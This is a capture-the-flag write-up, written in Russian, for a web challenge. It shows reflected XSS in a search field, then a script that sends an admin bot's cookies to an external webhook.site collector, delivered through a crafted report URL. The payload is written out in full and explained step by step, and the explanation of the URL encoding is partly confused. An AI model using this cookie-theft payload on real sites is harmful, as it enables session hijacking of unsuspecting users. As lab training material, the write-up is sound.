# task-2 

**level**: **Medium**

**Description**: Какой-то админ ворует наши публикации и выставляет их на свой сайт. Ты ведь не будешь сидеть сложа руки?

## Решение

Таск связан с XSS уязвимостью. Передадим самый элементарный payload в поле поиска для проверки.

```javascript
<script>alert('XSS')</script>
```


Посмотрив на станицу, мы можем увидеть кнопку **report**.


Админ будет проверять, так что мы можем украсть его cookie
Напишем payload.

```javascript
<script>
  document.location='https://webhook.site/1d127777-dc37-44fb-af01-f47a71bdefd2/?cookie='%252bencodeURIComponent(document.cookie)
</script>
```

И добавим его к нашему **report-у**.

```
http://62.173.140.174:16013/?report=http://62.173.140.174:16013/?search=<script>document.location='https://webhook.site/1d127777-dc37-44fb-af01-f47a71bdefd2/?cookie='%252bencodeURIComponent(document.cookie)</script>
```

Что это всё значит?

Данный URL запрос содержит два параметра: "**report**" и "**search**". 

Параметр "**report**" содержит ссылку на себя же `http://62.173.140.174:16013/?search=`, а параметр "**search**" содержит скрипт JavaScript, который использует XSS уязвимость для отправки пользовательских cookie на внешний сервер ( в данном случае на `https://webhook.site/1d127777-dc37-44fb-af01-f47a71bdefd2/?cookie=` ).

Рассмотрим подробнее

- **document.location** используется здесь для перенаправления пользователя на заданный URL `https://webhook.site/1d127777-dc37-44fb-af01-f47a71bdefd2/?cookie=`. Это сделано с целью отправки украденных cookie на внешний сервер без ведома пользователя.

- Функция **encodeURIComponent()** используется для преобразования специальных символов в их процентное представление в URL. В данном случае, **document.cookie** содержит информацию о cookie пользователя, которая может содержать специальные символы, такие как "=", "&", "?", и др. Функция bencodeURIComponent используется для правильного кодирования всего содержимого document.cookie перед его отправкой на внешний сервер.

- Теперь рассмотрим %252 в выражении %252bencodeURIComponent(document.cookie). %25 в URL представляет собой символ "%". Таким образом, %252 в данном контексте экранирует символ "%", чтобы он был передан как часть параметра в URL. После этого **encodeURIComponent(document.cookie)** кодирует содержимое cookie пользователя, и в результате получается правильный URL, который передаст скрытые cookie на внешний сервер при загрузке страницы с данным скриптом.

Вставим данный URL

И получаем флаг!)
